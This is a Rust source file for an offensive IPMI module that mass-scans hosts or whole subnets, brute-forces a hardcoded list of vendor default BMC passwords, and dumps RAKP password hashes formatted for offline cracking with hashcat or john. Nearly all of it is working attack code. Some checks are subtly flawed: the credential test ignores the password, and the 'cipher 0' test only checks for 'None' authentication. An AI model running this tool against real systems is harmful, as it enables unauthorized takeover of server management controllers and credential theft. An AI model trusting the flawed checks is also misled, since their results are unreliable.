//! IPMI Enumeration and Exploitation Module - FIXED VERSION
//!
//! Comprehensive IPMI scanner supporting:
//! - Mass scanning (Single, Subnet, File list)
//! - Version detection (IPMI 1.5/2.0)
//! - Cipher 0 authentication bypass detection
//! - Anonymous authentication testing
//! - Default credential brute force
//! - RAKP hash dumping for offline cracking
//! - Supermicro-specific vulnerability checks
//!
//! Default Port: 623/UDP
//! FOR AUTHORIZED TESTING ONLY.

use anyhow::{anyhow, Context, Result};
use colored::*;
use std::net::{IpAddr, SocketAddr};
use std::time::Duration;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use tokio::sync::Semaphore;
use tokio::net::UdpSocket;
use futures::stream::{FuturesUnordered, StreamExt};
use tokio::fs::OpenOptions;
use tokio::io::AsyncWriteExt;
use tokio::sync::Mutex;

use crate::utils::{
    normalize_target, prompt_default, prompt_port, prompt_yes_no,
    prompt_required, prompt_existing_file, prompt_int_range,
};

// IPMI Constants
const IPMI_PORT: u16 = 623;
const RECV_TIMEOUT_MS: u64 = 3000;
const MAX_RETRIES: usize = 2;

// RMCP Header
const RMCP_VERSION: u8 = 0x06;
const RMCP_RESERVED: u8 = 0x00;
const RMCP_SEQ: u8 = 0xFF;
const RMCP_CLASS_IPMI: u8 = 0x07;

// IPMI Commands
const IPMI_CMD_GET_CHANNEL_AUTH_CAP: u8 = 0x38;
const IPMI_CMD_GET_SESSION_CHALLENGE: u8 = 0x39;

// Authentication Types
const AUTH_TYPE_NONE: u8 = 0x00;
const AUTH_TYPE_MD5: u8 = 0x02;
const AUTH_TYPE_RMCPP: u8 = 0x06;

// RAKP Payload Types
const PAYLOAD_RMCPP_OPEN_SESSION_REQUEST: u8 = 0x10;
const PAYLOAD_RAKP_MESSAGE_1: u8 = 0x12;
const PAYLOAD_RAKP_MESSAGE_2: u8 = 0x13;

// Default credentials
const DEFAULT_CREDS: &[(&str, &str, &str)] = &[
    ("Dell iDRAC", "root", "calvin"),
    ("IBM IMM", "USERID", "PASSW0RD"),
    ("Fujitsu iRMC", "admin", "admin"),
    ("Supermicro IPMI", "ADMIN", "ADMIN"),
    ("Oracle/Sun ILOM", "root", "changeme"),
    ("ASUS iKVM BMC", "admin", "admin"),
    ("Generic", "admin", "admin"),
    ("Generic", "root", "root"),
    ("Generic", "Administrator", "password"),
];

#[derive(Debug, Clone)]
struct IpmiInfo {
    ip: IpAddr,
    version: String,
    auth_types: Vec<String>,
    cipher_zero_vulnerable: bool,
    anonymous_access: bool,
    valid_creds: Option<(String, String, String)>,
    rakp_hash: Option<String>,
    supermicro_upnp_open: bool,
    supermicro_49152_open: bool,
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   IPMI Enumeration & Exploitation Module (FIXED)         ║".cyan());
    println!("{}", "║   Mass Scan, Cipher 0, Default Creds, Version Detection   ║".cyan());
    println!("{}", "║   FOR AUTHORIZED TESTING ONLY                             ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    println!("Select operation mode:");
    println!("  1. Single Target");
    println!("  2. Subnet Scan (CIDR)");
    println!("  3. Target List (File)");
    println!();
    
    let mode = prompt_required("Select mode [1-3]: ")?;
    
    let targets = match mode.as_str() {
        "1" => {
             let t = if target.trim().is_empty() {
                 prompt_required("Target IP: ")?
             } else {
                 target.to_string()
             };
             vec![normalize_target(&t)?]
        },
        "2" => {
             let cidr = if target.trim().is_empty() || !target.contains('/') {
                 prompt_required("Target CIDR (e.g., 192.168.1.0/24): ")?
             } else {
                 target.to_string()
             };
             cidr.parse::<ipnetwork::IpNetwork>()
                 .context("Invalid CIDR format")?
                 .iter()
                 .map(|ip| ip.to_string())
                 .collect()
        },
        "3" => {
             let path = prompt_existing_file("Path to target list file: ")?;
             let content = tokio::fs::read_to_string(path)
                 .await
                 .context("Failed to read target file")?;
             content.lines()
                 .map(|s| s.trim().to_string())
                 .filter(|s| !s.is_empty())
                 .collect()
        },
        _ => return Err(anyhow!("Invalid selection")),
    };

    if targets.is_empty() {
        return Err(anyhow!("No valid targets found"));
    }

    // Check for extremely large scans
    if targets.len() > 100000 {
        println!("{}", format!("[!] Warning: Large scan detected ({} targets).", targets.len()).yellow().bold());
        if !prompt_yes_no("This may consume significant memory and time. Continue?", false)? {
             return Ok(());
        }
    }

    println!("[*] Loaded {} targets", targets.len());
    
    let port = prompt_port("IPMI Port", IPMI_PORT)?;
    let test_cipher_zero = prompt_yes_no("Test Cipher 0 vulnerability?", true)?;
    let test_anonymous = prompt_yes_no("Test anonymous authentication?", true)?;
    let test_default_creds = prompt_yes_no("Test default credentials?", true)?;
    let test_rakp_hash = prompt_yes_no("Attempt RAKP hash dumping (IPMI 2.0)?", true)?;
    
    let concurrency = if targets.len() > 1 {
        prompt_int_range("Max concurrent scans", 50, 1, 10000)? as usize
    } else {
        1
    };
    
    let output_file = prompt_default("Output result file", "ipmi_scan_results.csv")?;

    println!("\n{}", "=== Starting IPMI Scan ===".bold().cyan());
    
    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));
    
    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    let total_targets = targets.len();
    
    // Progress monitoring task
    if total_targets > 1 {
        tokio::spawn(async move {
            loop {
                tokio::time::sleep(Duration::from_secs(5)).await;
                let checked = s_checked.load(Ordering::Relaxed);
                let found = s_found.load(Ordering::Relaxed);
                if checked >= total_targets { break; }
                println!(
                    "[*] Progress: {}/{} checked, {} IPMI found",
                    checked, total_targets, found.to_string().green().bold()
                );
            }
        });
    }

    let mut tasks = FuturesUnordered::new();
    
    // Initialize output file with proper CSV headers
    let output_file_handle = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&output_file)
        .await
        .context("Failed to create output file")?;
    
    let mut file_handle = output_file_handle;
    file_handle.write_all(format!("IPMI Scan Results - {}\n", chrono::Local::now()).as_bytes()).await?;
    file_handle.write_all(b"IP,Port,Version,AuthTypes,Exploits,Cipher0,Anonymous,Credentials,RAKP_Hash,UPnP_1900,Port_49152\n").await?;
    
    let output_file_arc = Arc::new(Mutex::new(file_handle));

    for target_str in targets {
        let sem = semaphore.clone();
        let sc = stats_checked.clone();
        let sf = stats_found.clone();
        let of = output_file_arc.clone();
        let target_ip_str = target_str.clone();
        
        tasks.push(tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            
            // Resolve IP
            let ip_res = if let Ok(ip) = target_ip_str.parse::<IpAddr>() {
                 Ok(ip)
            } else {
                 match tokio::net::lookup_host(format!("{}:{}", target_ip_str, port)).await {
                     Ok(mut iter) => iter.next()
                         .map(|s| s.ip())
                         .ok_or_else(|| anyhow!("No IP resolved")),
                     Err(e) => Err(anyhow!(e)),
                 }
            };

            if let Ok(ip) = ip_res {
                let addr = SocketAddr::new(ip, port);
                
                // Perform Scan
                match scan_host(addr, test_cipher_zero, test_anonymous, test_default_creds, test_rakp_hash).await {
                    Ok(Some(info)) => {
                        sf.fetch_add(1, Ordering::Relaxed);
                        
                        // Display Result
                        let vuln_str = if info.cipher_zero_vulnerable { " [CIPHER0]".red().bold() } else { "".into() };
                        let anon_str = if info.anonymous_access { " [ANON]".red().bold() } else { "".into() };
                        let rakp_str = if info.rakp_hash.is_some() { " [HASH]".magenta().bold() } else { "".into() };
                        let upnp_str = if info.supermicro_upnp_open { " [UPNP]".yellow().bold() } else { "".into() };
                        let port_str = if info.supermicro_49152_open { " [49152]".yellow().bold() } else { "".into() };
                        let cred_str = if let Some((v, u, p)) = &info.valid_creds { 
                            format!(" [CRED: {} {}:{}]", v, u, p).green().bold() 
                        } else { 
                            "".into() 
                        };
                        
                        println!("[+] {}: {} {}{}{}{}{}{}", 
                            info.ip, 
                            info.version.green(), 
                            vuln_str, 
                            anon_str, 
                            rakp_str, 
                            upnp_str, 
                            port_str, 
                            cred_str
                        );
                        
                        // Save to file (thread-safe)
                        {
                            let mut file_guard = of.lock().await;
                            let auth_types_str = info.auth_types.join("; ");

                            let mut exploits = Vec::new();
                            if info.cipher_zero_vulnerable { exploits.push("CIPHER0_BYPASS"); }
                            if info.anonymous_access { exploits.push("ANON_AUTH"); }
                            if info.rakp_hash.is_some() { exploits.push("RAKP_HASH_DUMP"); }
                            if info.supermicro_upnp_open { exploits.push("UPNP_1900"); }
                            if info.supermicro_49152_open { exploits.push("SUPERMICRO_49152"); }
                            if info.valid_creds.is_some() { exploits.push("DEFAULT_CREDS"); }
                            let exploit_str = if exploits.is_empty() {
                                "VERSION_ONLY".to_string()
                            } else {
                                exploits.join(", ")
                            };

                            let cipher0_str = if info.cipher_zero_vulnerable { "Yes" } else { "No" };
                            let anon_str = if info.anonymous_access { "Yes" } else { "No" };
                            let creds_str = if let Some((v, u, p)) = &info.valid_creds {
                                format!("Yes - {} ({}:{})", v, u, p)
                            } else {
                                "No".to_string()
                            };
                            let rakp_str = info.rakp_hash.as_ref().unwrap_or(&"No".to_string()).clone();
                            let upnp_str = if info.supermicro_upnp_open { "Yes" } else { "No" };
                            let p49152_str = if info.supermicro_49152_open { "Yes" } else { "No" };

                            let line = format!(
                                "{},{},{},{},{},{},{},{},{},{},{}",
                                info.ip,
                                port,
                                info.version,
                                auth_types_str,
                                exploit_str,
                                cipher0_str,
                                anon_str,
                                creds_str,
                                rakp_str,
                                upnp_str,
                                p49152_str
                            );

                            let _ = file_guard.write_all(format!("{}\n", line).as_bytes()).await;
                        }
                    },
                    Ok(None) => {
                        // No IPMI service detected
                    },
                    Err(e) => {
                        eprintln!("[!] Error scanning {}: {}", ip, e);
                    }
                }
            }
            
            sc.fetch_add(1, Ordering::Relaxed);
        }));
    }
    
    // Wait for all tasks to complete
    while tasks.next().await.is_some() {}
    
    let final_checked = stats_checked.load(Ordering::Relaxed);
    let final_found = stats_found.load(Ordering::Relaxed);
    
    println!("\n{}", "=== Scan Complete ===".green().bold());
    println!("Targets scanned: {}", final_checked);
    println!("IPMI services found: {}", final_found.to_string().green().bold());
    println!("Results saved to: {}", output_file.cyan());
    
    Ok(())
}

async fn scan_host(
    addr: SocketAddr, 
    check_c0: bool, 
    check_anon: bool, 
    check_creds: bool,
    check_rakp: bool,
) -> Result<Option<IpmiInfo>> {
    // Use tokio async UDP socket
    let socket = UdpSocket::bind("0.0.0.0:0")
        .await
        .context("Failed to bind UDP socket")?;
    
    socket.connect(addr)
        .await
        .context("Failed to connect to target")?;

    // 1. Detect Version
    let (version, auth_types) = match detect_ipmi_version(&socket).await {
        Ok(res) => res,
        Err(_) => return Ok(None), // Not IPMI or unreachable
    };
    
    let mut info = IpmiInfo {
        ip: addr.ip(),
        version,
        auth_types,
        cipher_zero_vulnerable: false,
        anonymous_access: false,
        valid_creds: None,
        rakp_hash: None,
        supermicro_upnp_open: false,
        supermicro_49152_open: false,
    };
    
    // 2. Check Cipher 0
    if check_c0 && info.version.contains("2.0") {
        if let Ok(true) = test_cipher_zero_vuln(&socket).await {
            info.cipher_zero_vulnerable = true;
        }
    }
    
    // 3. Check Anonymous Access
    if check_anon {
        if let Ok(true) = test_credentials(&socket, "", "").await {
            info.anonymous_access = true;
        }
    }
    
    // 4. Test Default Credentials
    if check_creds {
        for (vendor, user, pass) in DEFAULT_CREDS {
            if let Ok(true) = test_credentials(&socket, user, pass).await {
                info.valid_creds = Some((vendor.to_string(), user.to_string(), pass.to_string()));
                break;
            }
        }
    }

    // 5. RAKP Hash Dump (IPMI 2.0 Only)
    if check_rakp && info.version.contains("2.0") {
        let target_users = ["admin", "root", "Administrator", "ADMIN"];
        for user in target_users {
            if let Ok(Some(hash)) = get_rakp_hash(&socket, user).await {
                info.rakp_hash = Some(hash);
                break; 
            }
        }
    }

    // 6. Supermicro Checks (UPnP 1900 + Port 49152)
    if scan_supermicro_upnp(addr.ip(), 1900).await {
        info.supermicro_upnp_open = true;
    }
    if scan_supermicro_upnp(addr.ip(), 49152).await {
        info.supermicro_49152_open = true;
    }

    Ok(Some(info))
}

// --- Helper Functions ---

fn build_rmcp_header() -> Vec<u8> {
    vec![
        RMCP_VERSION,    // Version
        RMCP_RESERVED,   // Reserved
        RMCP_SEQ,        // Sequence (0xFF for no ack)
        RMCP_CLASS_IPMI, // Class (IPMI)
    ]
}

fn build_get_auth_cap_request(channel: u8, privilege: u8) -> Vec<u8> {
    let mut packet = build_rmcp_header();
    packet.push(AUTH_TYPE_NONE); 
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Session Seq
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Session ID
    
    // Message data starts here (after IPMI session header)
    let msg_start = packet.len();
    
    packet.push(0x09); // Message length (will be adjusted)
    packet.push(0x20); // Target (BMC)
    packet.push((0x06 << 2) | 0x00); // NetFn (0x06 = App) / LUN
    
    let header_checksum = calculate_checksum(&packet[msg_start + 1..]);
    packet.push(header_checksum);
    
    packet.push(0x81); // Source (Requester)
    packet.push((0x00 << 2) | 0x00); // Seq/LUN
    packet.push(IPMI_CMD_GET_CHANNEL_AUTH_CAP); 
    packet.push(0x80 | channel); // Extended capabilities
    packet.push(privilege); 
    
    let data_checksum = calculate_checksum(&packet[msg_start + 4..]);
    packet.push(data_checksum);
    
    // Update message length
    packet[msg_start] = (packet.len() - msg_start - 1) as u8;
    
    packet
}

fn build_session_challenge_request(auth_type: u8, username: &str) -> Vec<u8> {
    let mut packet = build_rmcp_header();
    packet.push(AUTH_TYPE_NONE);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    
    let msg_start = packet.len();
    
    packet.push(0x18); // Message length placeholder
    packet.push(0x20); 
    packet.push((0x06 << 2) | 0x00); // NetFn / LUN
    
    let header_checksum = calculate_checksum(&packet[msg_start + 1..msg_start + 3]);
    packet.push(header_checksum);
    
    packet.push(0x81);
    packet.push((0x00 << 2) | 0x00);
    packet.push(IPMI_CMD_GET_SESSION_CHALLENGE);
    packet.push(auth_type);
    
    let mut user_bytes = [0u8; 16];
    let user_len = username.len().min(16);
    user_bytes[..user_len].copy_from_slice(&username.as_bytes()[..user_len]);
    packet.extend_from_slice(&user_bytes);
    
    let data_checksum = calculate_checksum(&packet[msg_start + 4..]);
    packet.push(data_checksum);
    
    // Update message length
    packet[msg_start] = (packet.len() - msg_start - 1) as u8;
    
    packet
}

fn calculate_checksum(data: &[u8]) -> u8 {
    let sum: u8 = data.iter().fold(0u8, |acc, &x| acc.wrapping_add(x));
    (!sum).wrapping_add(1)
}

async fn detect_ipmi_version(socket: &UdpSocket) -> Result<(String, Vec<String>)> {
    let request = build_get_auth_cap_request(0x0E, 0x04); 
    
    for attempt in 0..MAX_RETRIES {
        socket.send(&request)
            .await
            .context("Failed to send Get Channel Auth Capabilities request")?;
        
        let mut buffer = [0u8; 256];
        
        match tokio::time::timeout(
            Duration::from_millis(RECV_TIMEOUT_MS),
            socket.recv(&mut buffer)
        ).await {
            Ok(Ok(n)) if n > 20 => {
                // Validate RMCP header
                if buffer[0] != RMCP_VERSION || buffer[3] != RMCP_CLASS_IPMI {
                    continue;
                }
                
                // Check completion code (byte 20 in standard response)
                if n < 24 { continue; }
                let completion_code = buffer[20];
                if completion_code != 0x00 { 
                    return Err(anyhow!("IPMI returned error code: 0x{:02x}", completion_code)); 
                }
                
                let auth_type_support = buffer[22];
                let extended_cap = if n > 24 { buffer[24] } else { 0 };
                
                let mut auth_types = Vec::new();
                if auth_type_support & 0x01 != 0 { auth_types.push("None".to_string()); }
                if auth_type_support & 0x02 != 0 { auth_types.push("MD2".to_string()); }
                if auth_type_support & 0x04 != 0 { auth_types.push("MD5".to_string()); }
                if auth_type_support & 0x10 != 0 { auth_types.push("Password".to_string()); }
                if auth_type_support & 0x20 != 0 { auth_types.push("OEM".to_string()); }
                
                let version = if extended_cap & 0x02 != 0 {
                    "IPMI 2.0".to_string()
                } else {
                    "IPMI 1.5".to_string()
                };
                
                return Ok((version, auth_types));
            }
            Ok(Ok(_)) => continue,
            Ok(Err(e)) => {
                if attempt == MAX_RETRIES - 1 {
                    return Err(anyhow!("Recv error: {}", e));
                }
                continue;
            }
            Err(_) => {
                if attempt == MAX_RETRIES - 1 {
                    return Err(anyhow!("Timeout waiting for response"));
                }
                continue;
            }
        }
    }
    
    Err(anyhow!("No valid response after {} retries", MAX_RETRIES))
}

async fn test_cipher_zero_vuln(socket: &UdpSocket) -> Result<bool> {
    // Cipher 0 means authentication can be bypassed with "None" auth type
    // We already check this in detect_ipmi_version by looking at auth_type_support
    // This is a simplified check - for IPMI 2.0, cipher suite 0 specifically means
    // no authentication, no integrity, no confidentiality
    
    let request = build_get_auth_cap_request(0x0E, 0x04);
    socket.send(&request).await?;
    
    let mut buffer = [0u8; 256];
    match tokio::time::timeout(
        Duration::from_millis(RECV_TIMEOUT_MS),
        socket.recv(&mut buffer)
    ).await {
        Ok(Ok(n)) if n > 22 => {
            let auth_type_support = buffer[22];
            // If "None" authentication is supported, it's vulnerable
            Ok(auth_type_support & 0x01 != 0)
        }
        _ => Ok(false),
    }
}

async fn test_credentials(socket: &UdpSocket, username: &str, _password: &str) -> Result<bool> {
    let request = build_session_challenge_request(AUTH_TYPE_MD5, username);
    
    for _ in 0..MAX_RETRIES {
        socket.send(&request).await?;
        
        let mut buffer = [0u8; 256];
        match tokio::time::timeout(
            Duration::from_millis(RECV_TIMEOUT_MS),
            socket.recv(&mut buffer)
        ).await {
            Ok(Ok(n)) if n > 20 => {
                let completion_code = buffer[20];
                // 0x00 = success (user exists and session challenge returned)
                // 0xCC = invalid user
                if completion_code == 0x00 {
                    return Ok(true);
                }
                return Ok(false);
            }
            _ => continue,
        }
    }
    Ok(false)
}

/// Retrieve RAKP Hash (HMAC-SHA1) for offline cracking
/// Returns formatted hash compatible with hashcat/john
async fn get_rakp_hash(socket: &UdpSocket, username: &str) -> Result<Option<String>> {
    // Step 1: Send RMCP+ Open Session Request
    let open_req = build_rmcpp_open_session_request();
    socket.send(&open_req).await.context("Failed to send Open Session Request")?;
    
    let mut buffer = [0u8; 1024];
    let n = match tokio::time::timeout(
        Duration::from_millis(RECV_TIMEOUT_MS),
        socket.recv(&mut buffer)
    ).await {
        Ok(Ok(n)) if n > 36 => n,
        _ => return Ok(None),
    };
    
    // Validate RMCP header
    if buffer[0] != RMCP_VERSION { return Ok(None); }
    
    // Parse Open Session Response
    // Structure: RMCP(4) + Auth(1) + PayloadType(1) + SessionID(4) + Seq(4) + PayloadLen(2) + Payload
    if buffer[5] != (PAYLOAD_RMCPP_OPEN_SESSION_REQUEST + 1) { // Response is request + 1
        return Ok(None);
    }
    
    // Check status code in payload (offset 16)
    if n < 28 || buffer[16] != 0x00 { 
        return Ok(None); 
    }
    
    // Extract Managed System Session ID (offset 20-23, little-endian)
    let managed_session_id = u32::from_le_bytes([
        buffer[20], buffer[21], buffer[22], buffer[23]
    ]);
    
    // Step 2: Send RAKP Message 1
    let console_session_id = 0xAABBCCDD_u32; // Our chosen session ID
    let console_random = [0x41u8; 16]; // Random nonce
    
    let rakp1 = build_rakp_message_1(username, managed_session_id, console_session_id, &console_random);
    socket.send(&rakp1).await.context("Failed to send RAKP Message 1")?;
    
    // Step 3: Receive RAKP Message 2
    let n = match tokio::time::timeout(
        Duration::from_millis(RECV_TIMEOUT_MS),
        socket.recv(&mut buffer)
    ).await {
        Ok(Ok(n)) if n > 60 => n,
        _ => return Ok(None),
    };
    
    // Validate RAKP Message 2
    if buffer[0] != RMCP_VERSION { return Ok(None); }
    if buffer[5] != PAYLOAD_RAKP_MESSAGE_2 { return Ok(None); }
    
    // RAKP2 Payload starts at offset 16
    // Structure: Tag(1) + Status(1) + Reserved(2) + Console Session ID(4) + 
    //            Managed Random(16) + Managed GUID(16) + HMAC(20 for SHA1)
    
    let rakp2_offset = 16;
    if n < rakp2_offset + 60 { return Ok(None); }
    
    let status = buffer[rakp2_offset + 1];
    if status != 0x00 { 
        return Ok(None); // Authentication failed or user doesn't exist
    }
    
    // Extract salt (Managed System Random Number) - 16 bytes at offset 24
    let salt_offset = rakp2_offset + 8;
    let salt = &buffer[salt_offset..salt_offset + 16];
    
    // Extract HMAC - typically last 20 bytes (SHA1) at offset 40
    let hmac_offset = rakp2_offset + 40;
    let hmac = &buffer[hmac_offset..hmac_offset + 20];
    
    // Format for hashcat (mode 7300) or john
    // Format: $rakp$<salt_hex>$<hmac_hex>$<username>$<session_id_hex>
    let salt_hex = hex::encode(salt);
    let hmac_hex = hex::encode(hmac);
    let session_hex = format!("{:08x}", console_session_id);
    
    let hash = format!("$rakp${}${}${}${}", salt_hex, hmac_hex, username, session_hex);
    
    Ok(Some(hash))
}

fn build_rmcpp_open_session_request() -> Vec<u8> {
    let mut p = build_rmcp_header();
    p.push(AUTH_TYPE_RMCPP); // RMCP+ Auth Type
    p.push(PAYLOAD_RMCPP_OPEN_SESSION_REQUEST); // Payload Type
    p.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Session ID (0 for setup)
    p.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Sequence Number
    
    // Payload Length (32 bytes) - little endian
    p.extend_from_slice(&[0x20, 0x00]); 
    
    // Open Session Request Payload
    p.push(0x00); // Message Tag
    p.push(0x00); // Requested Max Privilege Level (0 = highest available)
    p.extend_from_slice(&[0x00, 0x00]); // Reserved
    
    // Console Session ID (our chosen ID)
    p.extend_from_slice(&[0xAA, 0xBB, 0xCC, 0xDD]);
    
    // Authentication Algorithm: RAKP-HMAC-SHA1
    p.extend_from_slice(&[
        0x00, 0x00, 0x00, 0x08, // Auth payload type + length
        0x01, 0x00, 0x00, 0x00  // Algorithm: RAKP-HMAC-SHA1
    ]);
    
    // Integrity Algorithm: HMAC-SHA1-96
    p.extend_from_slice(&[
        0x01, 0x00, 0x00, 0x08, // Integrity payload type + length
        0x01, 0x00, 0x00, 0x00  // Algorithm: HMAC-SHA1-96
    ]);
    
    // Confidentiality Algorithm: None
    p.extend_from_slice(&[
        0x02, 0x00, 0x00, 0x08, // Confidentiality payload type + length
        0x00, 0x00, 0x00, 0x00  // Algorithm: None
    ]);
    
    p
}

fn build_rakp_message_1(
    username: &str, 
    managed_session_id: u32,
    _console_session_id: u32,
    console_random: &[u8; 16]
) -> Vec<u8> {
    let mut p = build_rmcp_header();
    p.push(AUTH_TYPE_RMCPP);
    p.push(PAYLOAD_RAKP_MESSAGE_1);
    p.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Session ID (0)
    p.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Sequence
    
    // Calculate Payload Length
    let payload_len = 1 + 3 + 4 + 16 + 1 + 1 + username.len();
    p.extend_from_slice(&(payload_len as u16).to_le_bytes());
    
    // RAKP Message 1 Payload
    p.push(0x00); // Message Tag
    p.extend_from_slice(&[0x00, 0x00, 0x00]); // Reserved
    
    // Managed System Session ID (from Open Session Response)
    p.extend_from_slice(&managed_session_id.to_le_bytes());
    
    // Console Random Number (16 bytes)
    p.extend_from_slice(console_random);
    
    // Requested Max Privilege + Username present flag
    p.push(0x14); // 0x10 (username present) | 0x04 (Admin privilege)
    
    // Username Length and Username
    p.push(username.len() as u8);
    p.extend_from_slice(username.as_bytes());
    
    p
}

async fn scan_supermicro_upnp(ip: IpAddr, port: u16) -> bool {
    let addr = SocketAddr::new(ip, port);
    
    if let Ok(socket) = UdpSocket::bind("0.0.0.0:0").await {
        if socket.connect(addr).await.is_err() {
            return false;
        }
        
        // M-SEARCH SSDP packet
        let msg = "M-SEARCH * HTTP/1.1\r\n\
                   HOST: 239.255.255.250:1900\r\n\
                   MAN: \"ssdp:discover\"\r\n\
                   MX: 1\r\n\
                   ST: ssdp:all\r\n\r\n";
        
        if socket.send(msg.as_bytes()).await.is_ok() {
            let mut buf = [0u8; 1024];
            match tokio::time::timeout(
                Duration::from_millis(500),
                socket.recv(&mut buf)
            ).await {
                Ok(Ok(_)) => return true,
                _ => return false,
            }
        }
    }
    false
}